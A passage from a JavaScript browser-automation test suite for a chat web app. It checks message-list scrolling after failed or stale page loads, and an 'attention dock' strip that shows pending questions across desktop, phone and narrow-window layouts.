      const ST16 = (id) => `(() => { const x = ${ST(id)}, v = ${VIEW}, l = v._messageList; return { ...x, pinned: v._pinned, st: Math.round(l.scrollTop), gap: Math.round(l.scrollHeight - l.clientHeight - l.scrollTop), pick: v._needsCards._dockPick, badge: v._newMsgCount }; })()`;
      const STATUS16 = `(() => { const e = document.querySelector('.chat-history-status'); return e ? { text: e.textContent.trim(), shown: e.getClientRects().length > 0 && getComputedStyle(e).display !== 'none' && getComputedStyle(e).visibility !== 'hidden' && Number(getComputedStyle(e).opacity) > 0 } : null; })()`;
      const pressDown16 = async () => { const b = await A.evalJs(`(() => { const b = ${VIEW}._scrollBtn; if (!b || b.classList.contains('hidden')) return null; const r = b.getBoundingClientRect(); return r.width && r.height ? { x: r.left + r.width / 2, y: r.top + r.height / 2 } : null; })()`); if (b) { await A.clickAt(b.x, b.y); return 'clicked'; } await A.evalJs(`${VIEW}._scrollBtn.click()`); return 'click()'; };
      await TAIL16({ n: 0 });
      // (a) THE ↓ PRESSED BEFORE A LANDING (the probe's f3 — older than r3, on both trees: the ↓'s tail replaced the newer landing)
      const a0 = await choose(ids[1], 82);
      await TAIL16({ n: 1, ms: 3000 });
      const howDown = await pressDown16(); await sleep(400);
      await pick(ids[1]);
      await wait16(new RegExp('^landed:' + ids[1] + '='), 8000); const a1 = await A.evalJs(ST16(ids[1]));
      await wait16(/^tailPageBack$/, 8000); await sleep(2000);
      const a2 = await A.evalJs(ST16(ids[1])), ra = await r16();
      await A.shot('desktop-1280-r4-down-then-landing.png');
      check(`(a) (RED on b3fef024: the older ↓'s tail page came back and rebuilt the window at the live end — q82 gone, pinned) the ↓ (${howDown}) pressed BEFORE a landing: the newer landing stands — q82 in view in the window it was landed in (records ${a2.ws}–${a2.we} of ${a2.total}), not pinned; the ↓'s page dropped (${ra.join(' → ')})`, a0.card && a1.card && a2.card && a2.inView && /question 82/.test(a2.cmd) && a2.ws === a1.ws && a2.we < a2.total && !a2.pinned && ra.includes('trace:jumpToBottom:stale'), { a0, a1, a2, ra });
      // (b) A FAILED TAIL PAGE MOVES NOTHING (the probe's (e) — older than r3): q84 (no record ⇒ the tail road), its tail page fails
      await TAIL16({ n: 0 }); await choose(ids[1], 82); const b0 = await A.evalJs(ST16(ids[1]));
      await A.evalJs('(window.__r16 = [], 1)');
      await TAIL16({ n: 1, fail: true, ms: 600 });
      await pick(q84.id);
      await wait16(new RegExp('^landed:' + q84.id + '='), 12000); await sleep(1200);
      const b1 = await A.evalJs(ST16(ids[1])), rb = await r16(), sb = await A.evalJs(STATUS16);
      await A.shot('desktop-1280-r4-tail-failed.png');
      check(`(b) (RED on b3fef024: «end» — the mid-history window force-scrolled to its bottom, scrollTop 362 → 757, and q84 kept the dock pick) the tail page failed (${rb.join(' → ')}): said ONCE («${sb && sb.text}»), and nothing moved — scrollTop ${b0.st} → ${b1.st}, q82 in view ${b0.inView} → ${b1.inView}, the pin ${b0.pinned} → ${b1.pinned}, the pick ${b0.pick} → ${b1.pick}`, rb.includes('tailPageFAILED') && rb.includes('landed:' + q84.id + '=null') && !!sb && sb.shown && /Couldn.t load the latest messages/.test(sb.text) && Math.abs(b1.st - b0.st) <= 2 && b1.inView && b1.ws === b0.ws && b1.pinned === b0.pinned && b1.pick === b0.pick, { b0, b1, rb, sb });
      // (c) A STALE LANDING COUNTS ITS HELD TURN ONCE (the probe's (d) — new in r3: +14 for the server's +7): q84's tail page out
      //     6 s, q82 pressed (q84 is stale), a live turn (do:fill3) arrives while the page is out — held, replayed on the stale return
      await TAIL16({ n: 0 }); await choose(ids[1], 82);
      const T0 = (await page(0, 1)).total || 0, c0 = await A.evalJs(ST16(ids[1]));
      await A.evalJs('(window.__r16 = [], 1)');
      await TAIL16({ n: 1, ms: 6000 });
      await pick(q84.id);
      await wait16(/^tailPage\(/, 8000);
      await pick(ids[1]); await sleep(400);
      sayTo(sid, 'a live turn do:fill3');
      let T1 = T0; for (let i = 0; i < 40; i++) { T1 = (await page(0, 1)).total || 0; if (T1 >= T0 + 7) break; await sleep(200); }
      const held = await A.evalJs(`(() => { const v = ${VIEW}; return v._tailHold ? v._tailHold.ops.length : -1; })()`);
      await wait16(new RegExp('^landed:' + q84.id + '='), 15000); await sleep(2500);
      T1 = (await page(0, 1)).total || 0;
      const c1 = await A.evalJs(ST16(ids[1])), rc = await r16();
      await A.shot('desktop-1280-r4-stale-total.png');
      check(`(c) (RED on b3fef024: the stale tail page's total applied, then each replayed create counted again) the live turn arrived while q84's stale tail page was out (${held} ops held) — the window that stays counts it ONCE: its total ${c0.total} → ${c1.total} (+${c1.total - c0.total}) vs the server's ${T0} → ${T1} (+${T1 - T0}); q82 in view (records ${c1.ws}–${c1.we}) (${rc.join(' → ')})`, held > 0 && T1 >= T0 + 7 && rc.includes('trace:jumpToBottom:stale') && rc.includes('landed:' + q84.id + '=null') && c1.total - c0.total === T1 - T0 && c1.card && c1.inView && c1.ws === c0.ws, { c0, c1, T0, T1, held, rc });
      // (d) A SHOW THAT FAILS AFTER A JUMP PUTS BACK WHAT THE JUMP CHANGED: q81's record hidden by a CSS rule (B-2adb's shape —
      //     an element, no box); its landing reads up, jumpToIndex rebuilds the window there, the show fails
      await TAIL16(null);
      const rid81 = (all[where[0]] || {}).id || '';
      const toasts16 = () => A.evalJs(`[...document.querySelectorAll('.global-toast')].map((x) => x.textContent).join(' | ')`);
      // (d1) a PINNED reader at the live tail
      await toConv(A, sid, [], 1280, 800, false); await A.waitFor(`(() => { const v = ${VIEW}; return v._pinned && v._windowEnd >= v._total; })()`, 15000).catch(() => { }); await sleep(1500);
      await A.evalJs(`(() => { const s = document.createElement('style'); s.id = 'hide16'; s.textContent = '.chat-msg[data-msg-id="' + CSS.escape(${J(rid81)}) + '"] { display: none !important; }'; document.head.append(s); return 1; })()`); // (after the reload: toConv loads the page)
      await TAIL16({ n: 0 });
      const d0 = await A.evalJs(ST16(ids[1]));
      await pick(ids[0]);
      await wait16(new RegExp('^landed:' + ids[0] + '='), 15000);
      await A.waitFor(`(() => { const v = ${VIEW}; return v._pinned && v._windowEnd >= v._total; })()`, 10000).catch(() => { }); await sleep(1500);
      const d1 = await A.evalJs(ST16(ids[1])), t1 = await toasts16(), rd1 = await r16();
      await A.shot('desktop-1280-r4-failed-show-pinned.png');
      check(`(d1) (RED on b3fef024: left at records 0–50, unpinned, only a toast) a PINNED reader presses q81, whose record a CSS rule hides: the jump rebuilt the window there, the show failed — put back: pinned at the live tail again (records ${d1.ws}–${d1.we} of ${d1.total}, gap ${d1.gap}); the toast «${t1}» (${rd1.join(' → ')})`, !!rid81 && d0.pinned && rd1.includes('landed:' + ids[0] + '=null') && d1.pinned && d1.we >= d1.total && d1.gap <= 2 && /not drawn in this chat/.test(t1), { rid81, d0, d1, t1, rd1 });
      // (d2) a reader mid-history (q82 landed): put back at the record they were reading
      await choose(ids[1], 82); await sleep(3000);
      const READ16 = `(() => { const v = ${VIEW}, l = v._messageList, lr = l.getBoundingClientRect(); const m = [...l.querySelectorAll(':scope > .chat-msg')].find((x) => { const r = x.getBoundingClientRect(); return r.height > 0 && r.bottom > lr.top; }); return { id: m ? m.dataset.msgId : null, top: m ? Math.round(m.getBoundingClientRect().top) : null, ws: v._windowStart, we: v._windowEnd, pinned: v._pinned }; })()`;
      const e0 = await A.evalJs(READ16);
      await A.evalJs('(window.__r16 = [], 1)');
      await pick(ids[0]);
      await wait16(new RegExp('^landed:' + ids[0] + '='), 15000); await sleep(2500);
      const e1 = await A.evalJs(READ16), at1 = await A.evalJs(`(() => { const v = ${VIEW}, l = v._messageList, m = [...l.querySelectorAll(':scope > .chat-msg')].find((x) => x.dataset.msgId === ${J(e0.id)}); return m ? Math.round(m.getBoundingClientRect().top) : null; })()`), t2 = await toasts16(), rd2 = await r16();
      await A.shot('desktop-1280-r4-failed-show-reader.png');
      check(`(d2) (RED on b3fef024: left at records 0–50) a reader mid-history (records ${e0.ws}–${e0.we}, reading ${e0.id} at ${e0.top}) presses q81 (hidden): put back at the record they were reading — ${e0.id} at ${at1} (records ${e1.ws}–${e1.we}), not pinned (${rd2.join(' → ')})`, !!e0.id && rd2.includes('landed:' + ids[0] + '=null') && at1 != null && Math.abs(at1 - e0.top) <= 4 && e1.ws > 0 && !e1.pinned && /not drawn in this chat/.test(t2), { e0, e1, at1, t2, rd2 });
      await A.evalJs(`(() => { document.getElementById('hide16')?.remove(); return 1; })()`);
      await TAIL16(null);
    }
    await A.evalJs(`(() => { const m = app._inboxModel; if (window.__todos15) { Object.defineProperty(m, 'todos', window.__todos15); delete window.__todos15; } ${VIEW}._needsCards.schedule(); return 1; })()`);
  } catch (e) { fail++; console.log('  ✗ ⑭/⑮/⑯ threw: ' + (e?.message || e)); }
  lap('⑭ ⑮ ⑯ done');

  // ── ⑰ THE ATTENTION DOCK (lane needs-card-tail r10 — the owner 2026-10-30 on the ONE card r1–r9 docked at the end: «你没解决
  // 这个问题啊，只是加了一句话？如果历史对话里的内容就别停靠了呗，或者就不要停靠在聊天内容本身里了，而是体现出"这是专门停靠等我操作的
  // 事情，不会随着 chatview 浮动"的一个 UI»). THE RULE: a thing waiting for the owner is WINDOW CHROME, never a chat row. One
  // conversation of its own; the brief's stress shapes one after another, each read off the RENDERED page, each a shot ──
  console.log('⑰ THE ATTENTION DOCK — a fixed strip between the transcript and the message box: 1 / 3 / 30 items, a 400-char question, six options, an answer on the phone, 320 px, a 6-line composer, a filing 5000 px up');
  try {
    const done = (id) => A.evalJs(`fetch('/api/user-todos/' + encodeURIComponent(${J(id)}), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ status: 'done' }) }).then((r) => r.status)`);
    for (const it of (await api()).open) await done(it.id);
    const sid = await newConv('dock'); await sleep(600);
    // the phone page: its own (the suite's B is closed after ⑤ — one page left; a background page stalls CDP input)
    await A.cdp('Target.createTarget', { url: 'about:blank' }).catch(() => null);
    let tP2 = null; for (let i = 0; i < 40 && !tP2; i++) { tP2 = (await targets()).find((x) => x.id !== target.id); if (!tP2) await sleep(150); }
    const B = await connect(tP2);
    await A.front(); // (a page in the background gets no frames: the composer's rAF autosize, the cards' pass frame)
    /** the strip as rendered: where it stands (the list above it, the message box below), what it says, its targets */
    const DOCK = `(() => { const v = ${VIEW}; const d = v && v._attnDock; if (!d) return null;
      const box = (e) => { if (!e) return null; const r = e.getBoundingClientRect(); return { top: Math.round(r.top), bottom: Math.round(r.bottom), left: Math.round(r.left), right: Math.round(r.right), h: Math.round(r.height), w: Math.round(r.width) }; };
      const vis = (e) => !!e && e.getClientRects().length > 0 && getComputedStyle(e).visibility !== 'hidden';
      const row = d.querySelector('.cad-rows > .ut-item'), q = row && row.querySelector(':scope > .ut-body > .ut-text'), all = d.querySelector('.cad-all'), comp = d.parentElement && d.parentElement.querySelector(':scope > .chat-input-area'), cs = q ? getComputedStyle(q) : null;
      const targets = [...d.querySelectorAll('button, [role="button"]')].filter(vis).map((b) => ({ k: (b.getAttribute('data-label') || b.textContent || '').trim().slice(0, 24), chip: b.classList.contains('ut-opt'), ...box(b) }));
      const opts = d.querySelector('.cad-rows .ut-opts');
      return { shown: !d.hidden && d.getClientRects().length > 0, inList: v._messageList.contains(d), count: ((d.querySelector('.cad-count') || {}).textContent || '').trim(), all: all && !all.hidden ? all.textContent : null,
        rows: d.querySelectorAll('.cad-rows > .ut-item').length, id: row ? row.dataset.id : null, q: q ? q.textContent.slice(0, 60) : null, qPx: cs ? parseFloat(cs.fontSize) : 0, qCut: !!q && (q.scrollWidth > q.clientWidth + 1 || q.scrollHeight > q.clientHeight + 1), /* cut on its line, or at its two-line clamp (THE OPTIONS LAW ②) */ qH: q ? Math.round(q.getBoundingClientRect().height) : 0,
        dock: box(d), list: box(v._messageList), comp: box(comp), over: d.scrollWidth - d.clientWidth, targets, optsScroll: !!opts && getComputedStyle(opts).overflowX === 'auto' && opts.scrollWidth > opts.clientWidth, chips: [...d.querySelectorAll('.ut-opt')].filter(vis).map((c) => box(c)), pinned: !!v._pinned, tag: d.__tag17 || 0 }; })()`;
    const between = (x) => !!x && x.shown && !x.inList && !!x.list && !!x.comp && x.dock.top >= x.list.bottom - 1 && x.dock.bottom <= x.comp.top + 1;
    // an OPENED strip floats over the transcript (lane ui-phone-and-fit pick 0, law 5: «it opens over the chat, never moves its scroll»): its bottom stays on the message box, a spacer keeps its place
    const overChat = (x) => !!x && x.shown && !x.inList && !!x.list && !!x.comp && x.dock.bottom <= x.comp.top + 1 && x.dock.bottom >= x.list.bottom - 1;
    const dockIs = (P, id, n, ms = 10000) => P.waitFor(`(() => { const x = ${DOCK}; return !!x && x.shown && x.id === ${J(id)} && new RegExp(${J(n)}).test(x.count); })()`, ms);
    const VERBS4 = (x) => ['Reply', 'Open', 'Mark done', 'Dismiss'].every((k) => x.targets.some((y) => y.k === k));
    // (1) ONE item ⇒ one row, no door
    sayTo(sid, 'one ask do:q201');
    const [a1] = await byText(/^Stress question 201:/, 1);
    await toConv(A, sid, a1 ? [a1.id] : [], 1280, 800, false);
    await dockIs(A, a1 && a1.id, 'a question'); await sleep(400);
    const d1 = await A.evalJs(DOCK);
    await A.shot('desktop-1280-dock-one.png');
    check(`r10 (RED on bd5c5fd98: no strip — the count was a status-bar chip) ONE item ⇒ the strip stands BETWEEN the transcript and the message box (dock ${d1 && d1.dock.top}–${d1 && d1.dock.bottom}, list ends ${d1 && d1.list.bottom}, box starts ${d1 && d1.comp && d1.comp.top}; never inside the list): «${d1 && d1.count}» · «${d1 && d1.q}» on ONE line (${d1 && d1.qH} px), its verbs (${d1 && d1.targets.map((x) => x.k).join(' / ')}), no «View all»`,
      between(d1) && d1.rows === 1 && d1.id === a1.id && d1.all === null && /waiting for you · a question/.test(d1.count) && d1.qH <= 30 && VERBS4(d1), d1);
    const s1 = await A.evalJs(`document.querySelectorAll('.chat-status-foryou').length`);
    check('r10 …and the status bar carries no «waiting for you» chip any more (ONE place says it: the strip)', s1 === 0, s1);
    // (2) THREE ⇒ the count, the newest, the door
    sayTo(sid, 'two more do:q202 do:q203');
    const [, a2, a3] = await byText(/^Stress question 20[123]:/, 3);
    await dockIs(A, a3 && a3.id, '3 questions'); await sleep(400);
    await A.evalJs(`(() => { const d = ${VIEW}._attnDock; d.__tag17 = 3; return 1; })()`);
    const d3 = await A.evalJs(DOCK);
    await A.shot('desktop-1280-dock-three.png');
    check(`r10 THREE ⇒ the count «${d3 && d3.count}», the NEWEST (${d3 && d3.q}), «${d3 && d3.all}» — one row, never a «show more» in the strip; the same height as one (${d1 && d1.dock.h} → ${d3 && d3.dock.h} px)`,
      between(d3) && d3.rows === 1 && d3.id === a3.id && /^2 more · View all$/.test(d3.all || '') /* lane foryou-dock-layout: how many MORE, on the head's line */ && Math.abs(d3.dock.h - d1.dock.h) <= 2, d3);
    // «View all» ⇒ the For-you window scoped to THIS conversation
    await A.evalJs(`(() => { for (const w of [...app.wm.windows.values()]) if (w.type === 'inbox') app.wm.closeWindow(w.id); return 1; })()`);
    await A.press('.chat-attn-dock .cad-all', { touch: false });
    const iw = await A.waitFor(`[...app.wm.windows.values()].some((w) => w.type === 'inbox' && (w._openSpec || {}).sessionKey === ${J(a1 && a1.sessionKey)})`, 6000);
    await A.shot('desktop-1280-dock-view-all.png');
    check('r10 «View all» opens the For-you window scoped to THIS conversation (the cross-conversation list stays the tray\'s)', iw === true, iw);
    await A.evalJs(`(() => { for (const w of [...app.wm.windows.values()]) if (w.type === 'inbox') app.wm.closeWindow(w.id); return 1; })()`);
    await openOnly(A, sid); await sleep(600);
    // a tap on the question lands the ORIGINAL card (THE ONE LANDING: a navigation the owner asked for)
    await A.evalJs(`(() => { window.__d17 = []; new MutationObserver((ms) => { for (const m of ms) if (m.target.classList?.contains('chat-ask-flash') && m.target.dataset?.item) window.__d17.push(m.target.dataset.item); }).observe(document.body, { subtree: true, attributes: true, attributeFilter: ['class'] }); return 1; })()`);
    await A.press('.chat-attn-dock .cad-jump', { touch: false }) /* the landing is its own worded door (lane ui-phone-and-fit pick 0: the question now opens the item in place) */; await sleep(900);
    const fl = await A.evalJs('window.__d17 || []'), c3 = await A.evalJs(CARD(a3 && a3.id));
    check(`r10 a tap on the strip's question lands the ORIGINAL card in the flow — its card open in its tool card, in view, flashed (${J(fl)})`, fl.includes(a3.id) && !!c3 && c3.open && c3.rect.top >= c3.list.top - 1 && c3.rect.bottom <= c3.list.bottom + 1, { fl, c3 });
    // ONE PRESS ANSWERS, the strip updates IN PLACE (the same element, the next newest)
    await A.press('.chat-attn-dock .cad-rows .ut-item .ut-done', { touch: false });
    await dockIs(A, a2 && a2.id, '2 questions'); await sleep(300);
    const d2 = await A.evalJs(DOCK), gone3 = !(await api()).open.some((i) => i.id === a3.id);
    check(`r10 ONE PRESS on the strip's ✓ answers it (resolved on the hub: ${gone3}) and the strip updates IN PLACE — the same element (tag ${d2 && d2.tag}), the next newest «${d2 && d2.q}», «${d2 && d2.count}»`, gone3 && !!d2 && d2.tag === 3 && d2.id === a2.id, d2);
    // (3) ANSWERED ON THE PHONE while the desktop shows it — B at 390×844 touch, the same conversation
    await B.front(); await toConv(B, sid, [], 390, 844, true);
    await dockIs(B, a2 && a2.id, '2 questions'); await sleep(500);
    await openStrip(B); // (lane phone-dock-restore: the phone's row opened — its item's card as before)
    const p2 = await B.evalJs(DOCK);
    await B.shot('phone-390-dock-two.png');
    const small = p2 ? p2.targets.filter((x) => x.h < 44 || x.w < 44) : [];
    check(`r10 THE PHONE (390×844 touch): the same strip above the message box — its question ${p2 && p2.qPx} px (≥ 16), every target ≥ 44 × 44 with its word (${p2 && p2.targets.map((x) => x.k + ' ' + x.w + '×' + x.h).join(', ')})`,
      overChat(p2) && p2.qPx >= 16 && small.length === 0 && VERBS4(p2), { p2, small }); // OPENED, it floats over the transcript on the message box (lane ui-phone-and-fit pick 0)
    await A.evalJs(`(() => { window.__d17s = []; const f = () => { const d = ${VIEW}._attnDock, r = d.querySelector('.cad-rows > .ut-item'); window.__d17s.push((r ? r.dataset.id : '-') + '/' + ((d.querySelector('.cad-count') || {}).textContent || '')); if (window.__d17s.length < 400) setTimeout(f, 10); }; f(); return 1; })()`);
    await B.press('.chat-attn-dock .cad-rows .ut-item .ut-done', { touch: true });
    await A.front(); const moved = await dockIs(A, a1 && a1.id, 'a question');
    const seen = [...new Set(await A.evalJs('window.__d17s || []'))];
    check(`r10 the item answered ON THE PHONE leaves the desktop's strip live — the next one, the count in the same pass (${seen.join(' → ')})`, moved === true && seen.length === 2 && seen[0].startsWith(a2.id + '/') && seen[1].startsWith(a1.id + '/'), seen);
    // (4) MANY ⇒ still ONE row, the same height. THE STORE'S FLOOD GUARD caps a conversation's OWN open items at 20
    //     (src/user-todos.js MAX_OPEN_PER_SESSION — an agent looping on add); 29 more asked ⇒ 19 taken, 10 refused by the
    //     store (said to the agent, by name). Thirty in one strip needs items filed ABOUT it under another key — PURE ④'s
    //     dockOf leg holds 30; here the most one conversation can ask of its own
    sayTo(sid, 'twenty-nine more do:par ' + Array.from({ length: 29 }, (_, k) => 'do:q' + (204 + k)).join(' '));
    const t20 = await byText(/^Stress question 2(0[1-9]|[123]\d):/, 20, 120000);
    await logHas(/already has 20 open items/, 60000);
    const newest20 = t20.reduce((x, i) => (!x || i.createdAt >= x.createdAt ? i : x), null);
    await dockIs(A, newest20 && newest20.id, '20 questions', 20000); await sleep(600);
    const d30 = await A.evalJs(DOCK);
    await A.shot('desktop-1280-dock-twenty.png');
    const refused = (cliLog().match(/already has 20 open items/g) || []).length;
    check(`r10 MANY (29 more asked: the store took ${t20.length - 1}, refused ${refused} — its flood guard, 20 open per conversation) ⇒ «${d30 && d30.count}» + the newest + «${d30 && d30.all}» — still ONE row, the same height (${d30 && d30.dock.h} px)`, t20.length === 20 && refused === 10 && between(d30) && d30.rows === 1 && d30.id === newest20.id && /^19 more · View all$/.test(d30.all || '') && Math.abs(d30.dock.h - d1.dock.h) <= 2, { n: t20.length, refused, d30 });
    await B.front(); await toConv(B, sid, [], 390, 844, true); await dockIs(B, newest20 && newest20.id, '20 questions'); await sleep(400);
    await B.shot('phone-390-dock-twenty.png'); await A.front();
    for (const it of t20.slice(0, 5)) await done(it.id); // (room for the shapes below: 15 open)
    await dockIs(A, newest20 && newest20.id, '15 questions');
    // (5) A 400-CHARACTER QUESTION ⇒ one line, cut — the strip never grows with the words
    sayTo(sid, 'a long one do:big');
    const [big] = await byText(/^Before we cut the release/, 1, 60000);
    await dockIs(A, big && big.id, '16 questions'); await sleep(400);
    const dB = await A.evalJs(DOCK);
    await A.shot('desktop-1280-dock-400-chars.png');
    // THE OPTIONS LAW ② (the owner 2026-11-13): when options stand the question may take TWO lines before its cut (was: ONE line)
    check(`r10 a ${big ? big.text.length : 0}-character question ⇒ at most TWO lines in the strip, cut at its clamp (${dB && dB.qCut}), the strip ${dB && dB.dock.h} px (one line more than ${d1 && d1.dock.h} at most)`, !!big && big.text.length >= 400 && between(dB) && dB.qCut && dB.qH <= 48 && dB.dock.h - d1.dock.h <= 24, dB);
    // (6) SIX OPTIONS ⇒ the chips on ONE line beside the question's row (sideways if they must), never a wall
    sayTo(sid, 'six choices do:six');
    const [six] = await byText(/^Which region do we open next/, 1, 60000);
    await dockIs(A, six && six.id, '17 questions'); await sleep(400);
    const d6 = await A.evalJs(DOCK);
    await A.shot('desktop-1280-dock-six-options.png');
    // THE OPTIONS LAW (lane ui-phone-and-fit pick 0 — the owner 2026-11-13, a 500 px window: «回复：保留 ag», the rest cut by the
    // window's edge; 主开发's law: the options on a line of their own, WRAPPING, never a sideways scroll): was «six chips on ONE line»
    const whole = (x) => !!x && x.chips.length === 6 && x.chips.every((c) => c.left >= x.dock.left - 1 && c.right <= x.dock.right + 1) && x.over <= 1 && !x.optsScroll;
    check(`r10 SIX OPTIONS ⇒ six chips, each whole inside the strip (tops ${d6 && d6.chips.map((c) => c.top).join(',')}), no sideways scroll, the strip ${d6 && d6.dock.h} px`, between(d6) && whole(d6) && d6.dock.h <= 3 * d1.dock.h + 8, d6);
    await B.front(); await toConv(B, sid, [], 390, 844, true); await dockIs(B, six && six.id, '17 questions'); await sleep(400);
    await openStrip(B); // (lane phone-dock-restore: opened)
    const p6 = await B.evalJs(DOCK);
    await B.shot('phone-390-dock-six-options.png'); await A.front(); await sleep(300);
    check(`r10 …on the phone the six chips WRAP inside the opened strip (${p6 && p6.chips.length} chips, ${p6 && p6.chips.filter((c) => c.h >= 44).length} at ≥ 44 px), none past its edge, no sideways scroll; the strip ${p6 && p6.dock.h} px ≤ 45 % of the screen`, overChat(p6) && whole(p6) && p6.chips.every((c) => c.h >= 44) && p6.dock.h <= 0.45 * 844 + 8, p6);
    // (7) A WINDOW 320 px WIDE ⇒ the row under the head, nothing past the strip's edge
    await A.evalJs(`(() => { const w = ${CHAT(sid)}; if (!w) return false; if (w.isMaximized) app.wm.toggleMaximize(w.id); app.wm.resizeWindowTo(w.id, { w: 320, h: 700 }); return true; })()`); await sleep(900);
    const dN = await A.evalJs(DOCK);
    await A.shot('desktop-320-dock.png');
    const outside = dN ? dN.targets.filter((x) => x.left < dN.dock.left - 1 || x.right > dN.dock.right + 1) : [];   // the chips too (the options law)
    check(`r10 a window 320 px wide: the strip fits (overflow ${dN && dN.over} px, ${outside.length} verbs or chips past its edge, the options wrap — no sideways scroll: ${dN && !dN.optsScroll}), still between the transcript and the message box`, between(dN) && dN.over <= 1 && outside.length === 0 && !dN.optsScroll && dN.dock.w <= 322, { dN, outside });
    await A.evalJs(`(() => { const w = ${CHAT(sid)}; if (w && !w.isMaximized) app.wm.toggleMaximize(w.id); return 1; })()`); await sleep(700);
    // (8) THE COMPOSER GROWN TO 6 LINES ⇒ the strip rides above it, whole
    await A.evalJs(`(() => { const ta = document.querySelector(${J('.chat-input-area textarea')}); ta.focus(); ta.value = 'one\\ntwo\\nthree\\nfour\\nfive\\nsix'; ta.dispatchEvent(new Event('input', { bubbles: true })); return 1; })()`); await sleep(700);
    const dC = await A.evalJs(DOCK);
    await A.shot('desktop-1280-dock-composer-6-lines.png');
    check(`r10 the message box grown to 6 lines (${dC && dC.comp && dC.comp.h} px): the strip stands above it, whole (${dC && dC.dock.h} px)`, between(dC) && dC.comp.h > 120 && Math.abs(dC.dock.h - d6.dock.h) <= 2, dC);
    await A.evalJs(`(() => { const ta = document.querySelector(${J('.chat-input-area textarea')}); ta.value = ''; ta.dispatchEvent(new Event('input', { bubbles: true })); ta.blur(); return 1; })()`); await sleep(500);
    // (9) A FILING WHILE THE OWNER IS 5000 px UP ⇒ the strip shows it, the flow is untouched, no scroll jump; the strip never
    //     moves when the transcript scrolls
    sayTo(sid, 'a long history do:fill150t');
    await A.waitFor(`(() => { const v = ${VIEW}; return !!v && v._total >= 340 && v._pinned; })()`, 30000); await sleep(1500);
    const lc = await A.evalJs(`(() => { const r = ${VIEW}._messageList.getBoundingClientRect(); return { x: Math.round(r.left + r.width / 2), y: Math.round(r.top + r.height / 2), st: Math.round(${VIEW}._messageList.scrollTop) }; })()`);
    const dS0 = await A.evalJs(DOCK);
    for (let i = 0; i < 90; i++) { await A.cdp('Input.dispatchMouseEvent', { type: 'mouseWheel', x: lc.x, y: lc.y, deltaX: 0, deltaY: -400 }); await sleep(90); if (i > 10 && (await A.evalJs(`(() => { const l = ${VIEW}._messageList; return l.scrollHeight - l.scrollTop - l.clientHeight; })()`)) >= 5200) break; }
    await sleep(2500);
    const READ17 = (id) => `(() => { const v = ${VIEW}, l = v._messageList, lr = l.getBoundingClientRect(); const els = [...l.querySelectorAll(':scope > .chat-msg')].filter((x) => x.getClientRects().length); const m = ${J(id)} ? els.find((x) => x.dataset.msgId === ${J(id)}) : els.find((x) => x.getBoundingClientRect().bottom > lr.top + 40); if (!m) return null; const seen = [...l.querySelectorAll('.cn-card')].filter((c) => { const r = c.getBoundingClientRect(); return r.height > 0 && r.bottom > lr.top && r.top < lr.bottom; }).length; return { id: m.dataset.msgId, top: Math.round(m.getBoundingClientRect().top), st: Math.round(l.scrollTop), fromBottom: Math.round(l.scrollHeight - l.scrollTop - l.clientHeight), pinned: !!v._pinned, cards: seen }; })()`;
    const r0 = await A.evalJs(READ17(null)), dS1 = await A.evalJs(DOCK);
    check(`r10 THE STRIP NEVER MOVES WHEN THE TRANSCRIPT SCROLLS — the reader ${r0 && r0.fromBottom} px above the live end, the strip at ${dS0 && dS0.dock.top}–${dS0 && dS0.dock.bottom} → ${dS1 && dS1.dock.top}–${dS1 && dS1.dock.bottom}`, !!r0 && r0.fromBottom >= 5000 && !r0.pinned && !!dS1 && dS1.dock.top === dS0.dock.top && dS1.dock.bottom === dS0.dock.bottom, { lc, r0, dS0: dS0 && dS0.dock, dS1: dS1 && dS1.dock });
    sayTo(sid, 'one more do:q240');
    const [a240] = await byText(/^Stress question 240:/, 1);
    await dockIs(A, a240 && a240.id, '18 questions'); await sleep(1500);
    const r1 = await A.evalJs(READ17(r0 && r0.id)), dS2 = await A.evalJs(DOCK);
    await A.shot('desktop-1280-dock-5000-up.png');
    check(`r10 a needs card asked while the owner is ${r0 && r0.fromBottom} px up: the strip shows it («${dS2 && dS2.count}», ${dS2 && dS2.q}); the flow untouched — the record at the reader's line stays (${r0 && r0.id} at ${r0 && r0.top} → ${r1 && r1.top} px), unpinned, the cards on screen unchanged (${r0 && r0.cards} → ${r1 && r1.cards})`,
      !!a240 && !!r1 && !!r0 && r1.id === r0.id && Math.abs(r1.top - r0.top) <= 2 && !r1.pinned && r1.cards === r0.cards && dS2.id === a240.id && dS2.dock.bottom === dS0.dock.bottom, { r0, r1 });
    for (const it of (await api()).open) await done(it.id);
    const dE = await A.waitFor(`(() => { const x = ${DOCK}; return !!x && !x.shown; })()`, 8000);
    check('r10 nothing waiting ⇒ the strip is ABSENT (no empty chrome)', dE === true, dE);
    await B.close(); await A.cdp('Target.closeTarget', { targetId: tP2.id }).catch(() => null); // (one page left again)
  } catch (e) { fail++; console.log('  ✗ ⑰ threw: ' + (e?.message || e)); }
  lap('⑰ done');

  // ── ⑱ THE ANNOUNCE (lane needs-card-tail r10 addendum — the owner 2026-10-30 11:5x PDT: «有权限申请的时候窗口应该触发闪烁和 inbox
  // 附近的弹窗，有时候我都没发现有个后台任务才申请权限»): a NEW item that waits for the owner announces itself — the asking window
  // FLASHES (THE waiting blink: title bar + taskbar button), a CARD stands in one stack at the For-you button (who · what · its
  // clock; one press opens it), the window's strip count wears the attention fill until it is seen. Two conversations of their
  // own; the stress shapes: ten in a minute, one expiring while its card is up, two windows asking at once, the phone ──
  console.log('⑱ THE ANNOUNCE — an arrival that waits for the owner flashes its window and stands as a card at the For-you button');
  try {
    const done = (id) => A.evalJs(`fetch('/api/user-todos/' + encodeURIComponent(${J(id)}), { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ status: 'done' }) }).then((r) => r.status)`);
    for (const it of (await api()).open) await done(it.id);
    const s1 = await newConv('ann1'), s2 = await newConv('ann2'); await sleep(600);
    sayTo(s1, 'hello'); sayTo(s2, 'hello'); await sleep(1500);
    await A.front(); await A.device(1280, 800, { mouse: true }); await A.load();
    const open2 = `(() => { app.phoneHome?.hide?.(); for (const w of [...app.wm.windows.values()]) if (w.type === 'chat' && ![${J(s1)}, ${J(s2)}].includes(app.sessions.get(w.id)?.sessionId)) app.wm.closeWindow(w.id);
      if (!${CHAT(s1)}) app.attachSession(${J(s1)}, 'ops one', ${J(WORK)}, { mode: 'chat', backend: 'claude' }); if (!${CHAT(s2)}) app.attachSession(${J(s2)}, 'ops two', ${J(WORK)}, { mode: 'chat', backend: 'claude' }); return true; })()`;
